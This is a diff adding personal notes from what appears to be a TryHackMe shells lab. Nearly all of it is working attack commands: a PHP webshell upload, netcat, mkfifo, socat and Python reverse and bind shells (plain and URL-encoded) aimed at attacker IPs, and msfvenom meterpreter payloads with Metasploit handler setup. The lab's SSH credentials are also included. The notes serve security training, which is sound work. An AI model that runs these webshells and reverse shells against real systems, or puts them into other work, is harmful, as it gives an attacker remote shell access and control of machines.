@@ -1,0 +1,111 @@
+INFOS
+
+IP for the TARGET MACHINE: 10.10.38.43
+SSH username: shell
+SSH password: TryH4ckM3!
+SSH port: 22
+
+1. Upload a webshell and use "nc {LOCAL-IP} {PORT} -e /bin/bash" to send a reverse shell back to a waiting listener on your own machine!!!
+
+Visit the web server: http://10.10.38.43:80
+Create a .php file with next content and save it as script.php then upload it
+script.php
+<?php echo "<pre>" . shell.exec($_GET["cmd"]) . "</pre>"; ?>
+
+after upload, acces the script in /uploads ENDPOINT and add ?cmd=whoami
+the page shows as a response that contains www-data
+
+Set up a listener on your own machine
+nc -lnvp 8000
+
+add the next command to the URL in command cmd: ?cmd=nc+10.10.212.38+8000+-e+/bin/bash
+
+
+2. navigate to /usr/share/webshells/php/php_reverse_shell.php and change IP and port to your values.
+set up a netcat listener then upload and activate the shell
+nc -lnvp 8000
+upload the .php and click on it
+
+
+3. Log in with SSH and experiment with bind and reverse netcat shells
+ssh shell@10.10.38.43
+yes
+TryH4ckM3!
+
+BIND SHELL!!!
+open a listening port on the target machine
+http://10.10.38.43/uploads/script.php?cmd=nc+-nlvp+8989+-e+/bin/bash
+on the attacker machine connect to the listener using netcat: nc 10.10.38.43 8989
+OR
+http://10.10.38.43/uploads/script.php?cmd=mkfifo+/tmp/f;+nc+-lnvp+8989+<+/tmp/f+|+/bin/sh+>/tmp/f+2>&1;+rm+/tmp/f
+on the attacker machine connect to the listener using netcat: nc 10.10.38.43 8989
+
+REVERSE SHELL!!!
+on attacker mashine open a listening port: nc -lnvp 9000
+http://10.10.38.43/uploads/script.php?cmd=mkfifo+/tmp/f;+nc+<attacker_ip>+9000+<+/tmp/f+|+/bin/sh+>/tmp/f+2>&1;+rm+/tmp/f
+
+
+4. Practice reverse and bind shell using SOCAT. try both normal and special techniques
+which socat - to see what version of socat is installed
+
+BIND SHELL!!
+Set up a listening port on the target machine: socat TCP-L:8000 EXEC:"bash -li"
+Connect to the waiting listener from your attacking machine: socat TCP:10.10.38.43:8000 -
+
+REVERSE SHELL!!
+Set a listening port on your attacking machine: socat TCP-L:8000 -
+Connect back from the target machine: socat TCP:<attacker_ip>:8000 EXEC:"bash -li"
+
+SPECIAL TECHNIQUE REVERSE SHELL!!
+Set a listening port on your attacking machine: socat TCP-L:8000 FILE:`tty`,raw,echo=0
+Connect back from the target machine: socat TCP:<attacker_ip>:8000 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+5. REVERSE SHELL using PayloadAllTheThings git
+I chose the technique using Python
+http://10.10.38.43/uploads/script.php?cmd=which+python - no answer
+http://10.10.38.43/uploads/script.php?cmd=which+python3 - /usr/bin/python3
+Set a listening port on your attacking machine: nc -lnvp 9000
+http://10.10.38.43/uploads/script.php?cmd=python3%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.117.10%22%2C8000%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fsh%22%29%27%0A
+
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.117.10",8000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+URL encoded
+python3%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.117.10%22%2C8000%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fsh%22%29%27%0A
+
+
+6. Create both staged and stageless meterpreter shells. Upload and manually activate them, catching the shell with Netcat - does it works?
+
+
+STAGELESS
+msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o stageless_shell.elf LHOST=<attacker_ip> LPORT=8888
+Upload to the target: /uploads endpoit
+Set a listening port to your attacking machine: nc -lnvp 8888
+Activate the shell:	http://10.10.38.43/uploads/script.php?cmd=chmod +x stageless_shell.elf
+			http://10.10.38.43/uploads/script.php?cmd=./stageless_shell.elf
+we cannot communicate with it through netcat
+we try again with multi/handler:	msfconsole
+					set payload linux/x64/meterpreter_reverse_tcp
+					set LHOST <attacker_ip>
+					set LPORT 8888
+					exploit -j
+
+STAGED
+msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o staged_shell.elf LHOST=<attacker_ip> LPORT=8889
+Upload to the target: /uploads endpoint
+Set a listening port to your attacking machine: nc -lnvp 8889
+Activate the shell:	http://10.10.38.43/uploads/script.php?cmd=chmod +x staged_shell.elf
+			http://10.10.38.43/uploads/script.php?cmd=./staged_shell.elf
+we cannot communicate with it through netcat
+we try again with multi/handler:	msfconsole
+					set payload linux/x64/meterpreter/reverse_tcp
+					set LHOST <attacker_ip>
+					set LPORT 8889
+					exploit -j
+
+EXTRA: STAGELESS
+msfvenom -p linux/x64/shell_reverse_tcp -f elf -o stageless_shell.elf LHOST=<attacker_ip> LPORT=8888
+Upload to the target: /uploads endpoit
+Set a listening port to your attacking machine: nc -lnvp 8888
+Activate the shell:	http://10.10.38.43/uploads/script.php?cmd=chmod +x stageless_shell.elf
+			http://10.10.38.43/uploads/script.php?cmd=./stageless_shell.elf
+we can communicate with it through netcat
